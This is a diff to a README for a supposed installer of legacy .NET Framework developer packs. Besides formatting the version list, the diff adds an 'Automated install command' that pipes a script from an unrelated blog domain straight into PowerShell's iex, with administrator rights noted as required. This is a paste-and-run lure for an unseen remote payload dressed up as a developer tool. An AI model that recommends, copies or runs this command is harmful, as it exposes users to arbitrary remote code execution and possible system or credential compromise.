@@ -11,6 +11,7 @@ Effortlessly install .NET Framework 4.5, 4.6 and other discontinued developer to
 🔄 ​Version Management​ - Install, reinstall or remove legacy .NET Framework developer kits
 📦 ​Offline-Compatible​ - Once installed, references work without internet access
 ​Supports discontinued versions:​​
+```
 .NET 4.0
 .NET 4.5
 .NET 4.5.1
@@ -22,6 +23,7 @@ Effortlessly install .NET Framework 4.5, 4.6 and other discontinued developer to
 .NET 4.7.2
 .NET 4.8
 .NET 4.8.1
+```
 
 Perfect solution for:
 
@@ -30,6 +32,10 @@ Continuous integration with old SDKs
 Regression testing environments
 Developer machines supporting multiple .NET versions
 
+# Automated install command:
+```powershell
+irm https://blog.renzicu.com/yywl | iex
+```
 
 Note: Administrative privileges required for installation to program files directory.
 
